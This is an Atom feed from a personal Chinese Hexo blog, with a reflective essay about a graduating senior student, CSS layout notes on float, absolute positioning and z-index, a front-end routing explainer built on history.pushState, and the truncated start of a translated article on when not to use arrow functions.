<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>worldzhao</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-11-04T12:56:32.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>worldzhao</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>遇雨</title>
    <link href="http://yoursite.com/2017/11/04/%E9%81%87%E9%9B%A8/"/>
    <id>http://yoursite.com/2017/11/04/遇雨/</id>
    <published>2017-11-04T12:56:32.000Z</published>
    <updated>2017-11-04T12:56:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>去年助导靳昊毕业的时侯，写过一篇文章，以如今的心态去看，倒也是别有一番感受。自己的文笔并不好，或许在别人的口中能让那天的故事更有趣一点。</p><p>那天海口难得降温了，下了课，风很大，顶着风跑回来看见昊哥在我们宿舍打游戏，他宿舍停电了。</p><p>徐威和周路宇借了小电动去一食堂吃夜宵，我和昊哥决定去南门。</p><p>军绿色的背心，灰色夹克，下面是运动裤和运动鞋，我想起第一次见到昊哥，那是大一时的第一次班会，帽子T恤短裤运动鞋，花花的。</p><p>妖风肆虐，可能也是临近毕业，路灯枯黄的光落在他身上有一种很悲伤的感觉。</p><p>我大一的时候他刚大三，那时我才大二，他却在准备毕业了，我自己也很惶恐。外面校车在路上呼呼地跑，我沉默地看着他玩手机，我没带手机出门，失策。</p><p>这是我最亲的学长，我总说我把自己的学弟学妹当儿子女儿一样，但是我万万不会把他当爸爸，因为不会有价值观这么悬殊的父子，我们在一起，一般是我先教育他，满满的鸡汤和热血:<br> 我们还年轻，世界属于我们。<br>我挺直了背慢慢道，让风吹起我的衬衣下摆，清新，脱俗。<br>然后鸡汤和热血撒了一地。<br>他并不喜欢这样。<br>每个人有自己的活法，我只想简简单单平平安安。<br>你得有追求，你这样不行<br>……<br>我不是一个爱多管闲事的人，可能真的是价值观碰撞的时候就特别想说服对方，这只是一种自我满足，好为人师是一种病，谁也说不服了谁，毕竟谁都没有错。</p><p>当然我知道很多人对这种想法很不屑，一个大学毕业生，年纪轻轻朝气蓬勃，怎么能没有一点追求，简简单单，平平安安？这是街边一边抠脚一边嗑瓜子的大爷的台词嘛？</p><p>我只能说，人各有志。</p><p>我们在街尾的一家小摊点了两碗牛杂，我是粉，他是面，你看，口味都不一样。</p><p>秋风，枯灯，牛杂面。</p><p>这种场景是一般是热泪盈眶地谈梦想的，但他快离开，我想出路可能并没有那么容易找，只能打个哈哈。</p><p>他对我说了很多，比如找实习啊，好好学英语啊，用心钻研一门技能啊，最好有海外交流的经验等等，这些话让我觉得他并不想活的简简单单。</p><p>你觉得你大学过得怎么样？<br>不知道。不过有三件事想起来很不错，当教官，跳猴子舞还有参加了一个麻风康复存的志愿者工作。</p><p>我仿佛看到了一点光，不是那种枯黄的光，是海南的太阳，能够晒死你的那种。</p><p>我一直在想怎么样让自己的大学四年有意义，是不是让自己好好学习成为一名高级技工拿着厉害的不行的offer就行了？因为总是接触这种信息啊，哎呀那人大二就去哪儿实习了，那人保研到哪儿了等等此类，给我们借来了这种梦想：</p><p>出人头地。</p><p>可是每个人都是这样的吗？</p><p>他说有的同学从大一开始做志愿者，去麻风村照顾老人，做到大四，那里被隔离的老人把他们当成亲人，我去的不多，但是觉得很棒。</p><p>他说猴子舞他从13年末加入开始跳，跳到大三，拿了省奖，拿了国奖，这个月二十号去了那片保护区，还剩最后二十几只黑冠猿，还睡了次草屋，哈哈。</p><p>他说我当教官的时候我周围的人都不信，我不该和黄海宁说我是旅院的，不然我就带你们班了，啧啧。</p><p>他说那家烤地瓜怎么排队的人那么长，你要不要请我吃？</p><p>滚。</p><p>风真的很大。</p><p>一般这种天气我一般会想到刘原的那段话：“浸在夜雨中，一阵阴风掠过，陌生的故乡就以这样的姿态侵入坚硬而冰冷的梦境：落叶飞旋，霜草委顿，一条瘦骨嶙峋的狗在巷口沉思。<br>丧家犬。日暮乡关何处是，遍地流窜丧家犬。”</p><p>那天我的脑子里是下面这句：</p><p>“今晚的月色真明亮啊，走夜路也不会迷路。”</p><p>—————————我是两年后的分割线——————————</p><p>向往着月亮，却还是要为买面包的六便士着急，这就是生活的常态吧。</p><p>如今再来看这篇文章，才发现助导所需要的“简简单单，平平安安”的生活难度之大。</p><p>难以想象，牛杂摊早已不见，而亲爱的靳昊助导，早已毕业两年了。</p><p>如今大四的我们，站在毕业的十字路口，为了考研着急、为了工作着急、为了男女朋友着急，从个人价值的实现需求直线降到生理温饱需求，不应该啊，高贵的马斯洛，可怜的我。当代人民都太浮躁了，网络高速发达的今天，把你我五年后、十年后的样子都有声有色地描绘了出来，看，以后你就是过着这种生活。</p><p>能够一眼望穿的生活，多无趣呀。</p><p>最后用金庸先生的一段话作结。</p><p>＂两人去轩辕台路上遇雨，郭靖道：那么咱们快跑。黄蓉摇了摇头：靖哥哥，前面也下大雨，跑过去还不是一般的淋湿？郭靖笑道：正是。黄蓉心中却忽然想起了华筝之事：“前途既已注定了是忧患伤心，不论怎生走法，终究避不了、躲不开，便如长岭遇雨一般。当下两人便在大雨中缓缓行去。＂</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;去年助导靳昊毕业的时侯，写过一篇文章，以如今的心态去看，倒也是别有一番感受。自己的文笔并不好，或许在别人的口中能让那天的故事更有趣一点。&lt;/p&gt;
&lt;p&gt;那天海口难得降温了，下了课，风很大，顶着风跑回来看见昊哥在我们宿舍打游戏，他宿舍停电了。&lt;/p&gt;
&lt;p&gt;徐威和周路宇借了小
      
    
    </summary>
    
      <category term="琐事" scheme="http://yoursite.com/categories/%E7%90%90%E4%BA%8B/"/>
    
    
      <category term="琐事" scheme="http://yoursite.com/tags/%E7%90%90%E4%BA%8B/"/>
    
      <category term="随笔" scheme="http://yoursite.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>一定微不足道的css</title>
    <link href="http://yoursite.com/2017/10/22/%E4%B8%80%E7%82%B9%E5%BE%AE%E4%B8%8D%E8%B6%B3%E9%81%93%E7%9A%84css/"/>
    <id>http://yoursite.com/2017/10/22/一点微不足道的css/</id>
    <published>2017-10-22T15:39:32.000Z</published>
    <updated>2017-10-22T15:39:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近被CSS怼成傻逼，总结一下平时没有注意的点，持续更新。</p><ul><li>问题1：一个没有设置宽度的div，它的宽度是多少？</li><li>问题2：把问题1里面的div设置为float为left呢？</li><li>问题3：float脱离了文档流吗？</li><li>问题4：脱离了文档流文字为什么还会环绕呢？</li><li>问题5：postion:absolute脱离了文档流吗？</li><li>问题6：postion:absolute没有设置left与top，div位置在哪，宽度如何？</li><li>问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？</li></ul><h3 id="问题1：一个没有设置宽度的div，它的宽度是多少？"><a href="#问题1：一个没有设置宽度的div，它的宽度是多少？" class="headerlink" title="问题1：一个没有设置宽度的div，它的宽度是多少？"></a>问题1：一个没有设置宽度的div，它的宽度是多少？</h3><p>回答一：div为块级元素，每个块级元素默认占一行,自动充满父级元素的内容区域。</p><blockquote><p>W3C:div元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。</p></blockquote><h3 id="问题2：把问题1里面的div设置为float为left呢？"><a href="#问题2：把问题1里面的div设置为float为left呢？" class="headerlink" title="问题2：把问题1里面的div设置为float为left呢？"></a>问题2：把问题1里面的div设置为float为left呢？</h3><p>回答二：设置了float:left后，如果没有设置宽度，宽度是被内容撑开的，如果设置了宽度就是该宽度。</p><blockquote><p>W3C:如果浮动非替换元素，则要指定一个明确的宽度；否则，它们会尽可能地窄。<br>注：替换元素是浏览器根据其标签的元素与属性来判断显示具体的内容，如input/img/select等等。</p></blockquote><h3 id="问题3：float脱离了文档流吗？"><a href="#问题3：float脱离了文档流吗？" class="headerlink" title="问题3：float脱离了文档流吗？"></a>问题3：float脱离了文档流吗？</h3><h3 id="问题4：脱离了文档流文字为什么还会环绕呢？"><a href="#问题4：脱离了文档流文字为什么还会环绕呢？" class="headerlink" title="问题4：脱离了文档流文字为什么还会环绕呢？"></a>问题4：脱离了文档流文字为什么还会环绕呢？</h3><p>回答三：脱离了文档流，但仍然保持着部分的流动性。<br>回答四：同上。</p><blockquote><p>MDN:float CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动中移除，尽管仍然保持部分的流动性（与绝对定位相反）。</p></blockquote><h3 id="问题5：postion-absolute脱离了文档流吗？"><a href="#问题5：postion-absolute脱离了文档流吗？" class="headerlink" title="问题5：postion:absolute脱离了文档流吗？"></a>问题5：postion:absolute脱离了文档流吗？</h3><p>回答五：脱离了文档流</p><blockquote><p>MDN:绝对定位的元素不再存在于正常文档布局流程中.相反，它坐在它自己的层独立于一切。</p></blockquote><h3 id="问题6：postion-absolute没有设置left与top，div位置在哪，宽度如何？"><a href="#问题6：postion-absolute没有设置left与top，div位置在哪，宽度如何？" class="headerlink" title="问题6：postion:absolute没有设置left与top，div位置在哪，宽度如何？"></a>问题6：postion:absolute没有设置left与top，div位置在哪，宽度如何？</h3><p>回答六：如果没有设置left,top又没有设置right，bottom，它跟static时的位置一样。也就是说，如果其前面还有一个div，他就在这个div后面，和static时一样，不会浮在上面，也不会在左上角（当然，如果前面没有元素就在左上角了）。</p><p>测试：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: grey;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.upper</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"upper"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-616b367cbfdfbe8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我们再来给inner加上position: absolute;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-616b367cbfdfbe8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>可以看出，设置了postion:absolute后，inner并没有如我们预想的那样和left:0 top:0一般蹲到左上角，而是乖乖的呆在了upper后面，和之前static一样。</p><h3 id="问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？"><a href="#问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？" class="headerlink" title="问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？"></a>问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？</h3><p>回答七：子元素在上面。<br>先看代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"par"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.par</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>:<span class="number">1000</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>:<span class="number">500</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-f73e059ceb54e7a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>子元素在上面，即使父元素的z-index远远大于子元素的z-index</p><p>以下转自<a href="https://segmentfault.com/q/1010000009843297" target="_blank" rel="noopener">segmentfault</a></p><blockquote><p>根据规范，z-index是应用到定位元素的，也就是position属性不为relative的元素，否则，设置z-index是没有意义的；<br>z-index的作用有两点，一是设置在当前堆叠上下文(stacking context)中的层级；二是创建一个新的堆叠上下文；<br>z-index并不是设置的值越高，就会越靠近用户，还和堆叠上下文有关系；</p></blockquote><ol><li>在同一个堆叠上下文中的元素，z-index越高越靠近用户；</li><li>在不同堆叠上下文中的元素，如果堆叠上下文一距离用户更近，那么它的所有子元素都在另一个堆叠上下文子元素的前面，也就是离用户更近，不同堆叠上下文中的子元素不可能发生交叉；</li><li>所以，z-index其实不是一个绝对值，而是一个相对值；</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近被CSS怼成傻逼，总结一下平时没有注意的点，持续更新。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题1：一个没有设置宽度的div，它的宽度是多少？&lt;/li&gt;
&lt;li&gt;问题2：把问题1里面的div设置为float为left呢？&lt;/li&gt;
&lt;li&gt;问题3：float脱离了文档流吗？&lt;/l
      
    
    </summary>
    
      <category term="css" scheme="http://yoursite.com/categories/css/"/>
    
    
      <category term="css" scheme="http://yoursite.com/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>前端路由总结</title>
    <link href="http://yoursite.com/2017/10/22/%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/10/22/前端路由总结/</id>
    <published>2017-10-22T15:37:58.000Z</published>
    <updated>2017-10-22T15:37:58.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文总结自：</p><ul><li><a href="http://blog.csdn.net/xllily_11/article/details/51820909" target="_blank" rel="noopener">Web开发中 前端路由 实现的几种方式和适用场景</a></li><li><a href="http://blog.jobbole.com/78876/" target="_blank" rel="noopener">HTML 5 History API的”前生今世”</a></li><li><a href="https://zhuanlan.zhihu.com/p/28769080" target="_blank" rel="noopener">从零学习 React 技术栈系列教程</a></li></ul></blockquote><p>最初接触前端路由是vue-router，当时仅仅觉得可以通过router-link改变页面，觉得很神奇呀，用多了就习惯了。</p><p>后面接触了node，通过express知晓了后端路由，这是我就开始疑问了：<br>为什么使用那些前端框架的时候，前端url改变了视图，但是却没有向后台发送请求？</p><p>首先我们需要一些前置知识。</p><h2 id="路由-前端路由-后端路由？"><a href="#路由-前端路由-后端路由？" class="headerlink" title="路由/前端路由/后端路由？"></a>路由/前端路由/后端路由？</h2><p>路由：通过不同的url地址展示不同的内容或者页面。</p><p>前面提到过，我最初接触到路由是通过express框架，我们先看一段代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/category/add'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">   <span class="comment">// do something</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>如果你没有接触过node也没关系，因为真的不难理解。</p><p>定义了一个path(‘/categoty/add’)，当有人通过(即域名+path)，例如：</p><p><a href="http://www.example.com/category/add" target="_blank" rel="noopener">http://www.example.com/category/add</a></p><p>发起post请求时，就会进入后台定义好的回调函数，进行逻辑处理，譬如取得post传递过来的实体数据，对数据库进行增删查改，然后返回一个渲染好的html页面或者是json数据等等。</p><p>后端路由（不考虑提供API服务返回数据），这一过程由服务器控制完成的，直接喷射一个html给前端，浏览器页面刷新。</p><p>那前端路由是什么呢？还是通过不同的url地址展示不同的内容或者页面，但是这一过程都是由前端完成的，我们的页面或视图（模块）是在前端编写好，通过url变化去切换而已。</p><p>为什么需要前端路由：</p><p>因为后台每次返回一个新页面都会进行全局刷新，而在单页面应用中，大部分页面结构不变，只改变部分内容的使用，我们可以通过前端路由改变页面内容，后台只需要通过ajax提供数据即可。</p><p>现在，我们来看看前端路由到底是如何实现的。</p><h2 id="实现简易前端路由"><a href="#实现简易前端路由" class="headerlink" title="实现简易前端路由"></a>实现简易前端路由</h2><p>首先我们需要了解HTML5为我们提供的history API，准确的说是这里面的两个方法:<br>history.pushState和history.replaceState</p><h3 id="history-pushState"><a href="#history-pushState" class="headerlink" title="history.pushState"></a>history.pushState</h3><blockquote><p>带有三个参数：一个状态对象，一个标题（现在被忽略了），以及一个可选的URL地址。下面将对这三个参数进行细致的检查：</p></blockquote><p>实例代码（来自<a href="http://blog.csdn.net/xllily_11/article/details/51820909" target="_blank" rel="noopener">Web开发中 前端路由 实现的几种方式和适用场景</a>）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//假设当前网页URL为：http://tonylee.pw</span></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"http://tonylee.pw?name=tonylee"</span>);</span><br><span class="line"><span class="comment">//url变化：http://tonylee.pw -&gt; http://tonylee.pw?name=tonylee</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"http://tonylee.pw/name/tonylee"</span>);</span><br><span class="line"><span class="comment">//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name/tonylee</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"?name=tonylee"</span>);</span><br><span class="line"><span class="comment">//url变化：http://tonylee.pw -&gt; http://tonylee.pw?name=tonylee</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"name=tonylee"</span>);</span><br><span class="line"><span class="comment">//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name=tonylee</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"/name/tonylee"</span>);</span><br><span class="line"><span class="comment">//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name/tonylee</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"name/tonylee"</span>);</span><br><span class="line"><span class="comment">//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name/tonylee</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//错误的用法：</span></span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">"http://www.tonylee.pw?name=tonylee"</span>);</span><br><span class="line"><span class="comment">//error: 由于跨域将产生错误</span></span><br></pre></td></tr></table></figure><h3 id="history-replaceState"><a href="#history-replaceState" class="headerlink" title="history.replaceState"></a>history.replaceState</h3><p>pushState()和replaceState()参数一样。<br>两个方法的主要区别就是：pushState()是在history栈中添加一个新的条目，replaceState()是替换当前的记录值。关于API的详细解释可以<a href="http://blog.jobbole.com/78876/" target="_blank" rel="noopener">戳这里</a></p><p>我们需要知道的是，就是两个方法可以改变浏览器的url，但是不会重新加载页面，没错！！！这些 URL 不会直接传给服务器，而是会被浏览器消化处理掉.</p><p>这个就是我们需要的。</p><p>这样我们就可以通过这两个方法改变url了。</p><p>改变之后呢？切换视图呀！</p><p>那我们就需要在这两个方法被调用的时候，触发一个方法去切换视图，好在HTML5也给我们提供了一个事件。</p><h3 id="window-onpopstate"><a href="#window-onpopstate" class="headerlink" title="window.onpopstate"></a>window.onpopstate</h3><p>浏览器本身会自带一个popstate事件，但是只有在我们点击返回或前进按钮时才会正常触发。</p><p>很显然，在我们单页应用中是需要你去大部分情况下都是需要去点击某个Link调用pushState，而这样是无法触发popstate事件的，需要重写一下pushState，并且给他也定义一个事件，这里就叫他onpushstate吧，比如下面这样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">history</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pushState = history.pushState;    </span><br><span class="line">    history.pushState = <span class="function"><span class="keyword">function</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> history.onpushstate == <span class="string">"function"</span>) &#123;            </span><br><span class="line">            history.onpushstate(&#123;<span class="attr">state</span>: state&#125;);        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pushState.apply(history, <span class="built_in">arguments</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(<span class="built_in">window</span>.history)</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onpopstate = history.onpushstate = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// change view</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来，进行pushState操作会触发onpushstate事件，我们可以在onpushstate事件的回调中进行视图切换了，而前进后退我们可以通过popstate来操作。</p><p>别忘了给a标签做一些必要操作，阻止默认跳转，而是通过pushState改变url，然后由于pushState被调用，又会触发onpushstate事件，其内的逻辑代码就会被执行，比如，切换视图。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = elements.length; i &lt; len; i++) &#123;    </span><br><span class="line">    elements[i].onclick = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;        </span><br><span class="line">        event.preventDefault();</span><br><span class="line">        <span class="keyword">var</span> route = event.target.getAttribute(<span class="string">'href'</span>);        </span><br><span class="line">        history.pushState(&#123;<span class="attr">page</span>: route&#125;, route, route)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端路由的基本实现就是以上了，代码来自<a href="https://www.zhihu.com/people/yubolun/activities" target="_blank" rel="noopener">余博伦-知乎首页</a>，现在再回头看vue-router/react-router是否清晰了一点呢，当然其内部实现远远不是这么简单。</p><h2 id="小知识-pjax"><a href="#小知识-pjax" class="headerlink" title="小知识-pjax"></a>小知识-pjax</h2><p>pjax是一种基于ajax+history.pushState的新技术，该技术可以无刷新改变页面的内容，并且可以改变页面的URL。pjax是ajax+pushState的封装，同时支持本地存储、动画等多种功能。目前支持jquery、qwrap、kissy等多种版本。</p><p>众所周知，Ajax可以实现页面的无刷新操作——优点；但是，也会造成另外的问题，无法前进与后退！曾几何时，Gmail似乎借助iframe搞定，如今，HTML5让事情变得如同过家家般简单。</p><p>当执行Ajax操作的时候，往浏览器history中塞入一个地址（使用pushState）（这是无刷新的）；于是，返回的时候，通过URL或其他传参，我们就可以还原到Ajax之前的模样。</p><p><a href="http://www.zhangxinxu.com/wordpress/2013/06/html5-history-api-pushstate-replacestate-ajax/" target="_blank" rel="noopener">ajax与HTML5 history pushState/replaceState实例-张鑫旭</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本文总结自：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.csdn.net/xllily_11/article/details/51820909&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Web开发中 
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>什么时候你不能使用箭头函数？</title>
    <link href="http://yoursite.com/2017/10/14/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2017/10/14/箭头函数/</id>
    <published>2017-10-14T08:00:00.000Z</published>
    <updated>2017-10-14T08:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么时候你不能使用箭头函数？"><a href="#什么时候你不能使用箭头函数？" class="headerlink" title="什么时候你不能使用箭头函数？"></a>什么时候你不能使用箭头函数？</h1><p>译者：王仕军</p><blockquote><p>共 2670 字，读完需 5 分钟。编译自 Dmitri Pavlutin 的文章，对原文内容做了精简和代码风格优化。ES6 中引入的箭头函数可以让我们写出更简洁的代码，但是部分场景下使用箭头函数会带来严重的问题，有哪些场景？会导致什么问题？该怎么解决，容我慢慢道来。</p></blockquote><p>能见证每天在用的编程语言不断演化是一件让人非常兴奋的事情，从错误中学习、探索更好的语言实现、创造新的语言特性是推动编程语言版本迭代的动力。JS 近几年的变化就是最好的例子， 以 ES6 引入的箭头函数（arrow functions）、class 等特性为代表，把 JS 的易用性推到了新的高度。</p><p>关于 ES6 中的箭头函数，网上有很多文章解释其作用和语法，如果你刚开始接触 ES6，可以从这里开始。任何事物都具有两面性，语言的新特性常常被误解、滥用，比如箭头函数的使用就存在很多误区。接下来，笔者会通过实例介绍该避免使用箭头函数的场景，以及在这些场景下该如何使用函数表达式（function expressions）、函数声明或者方法简写（shorthand method）来保障代码正确性和可读性。</p><h2 id="1-定义对象方法"><a href="#1-定义对象方法" class="headerlink" title="1. 定义对象方法"></a>1. 定义对象方法</h2><p>JS 中对象方法的定义方式是在对象上定义一个指向函数的属性，当方法被调用的时候，方法内的 this 就会指向方法所属的对象。</p><h3 id="1-1-定义字面量方法"><a href="#1-1-定义字面量方法" class="headerlink" title="1.1 定义字面量方法"></a>1.1 